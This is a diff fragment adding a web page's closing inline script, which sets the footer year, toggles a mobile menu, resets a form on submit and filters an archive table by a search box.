+document.getElementById('y').textContent=new Date().getFullYear();
+document.getElementById('burger').addEventListener('click',function(){document.getElementById('menu').classList.toggle('open')});
+document.querySelectorAll('#menu a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open')})});
+document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();this.reset();document.getElementById('ok').style.display='inline-block'});
+(function(){var q=document.getElementById('find');var rows=document.querySelectorAll('#arc tbody tr');q.addEventListener('input',function(){var k=q.value.trim().toLowerCase();var n=0;rows.forEach(function(r){var hit=!k||r.textContent.toLowerCase().includes(k);r.style.display=hit?'':'none';if(hit)n++});document.getElementById('none').hidden=n>0});})();
+</script>
+</body>
+</html>
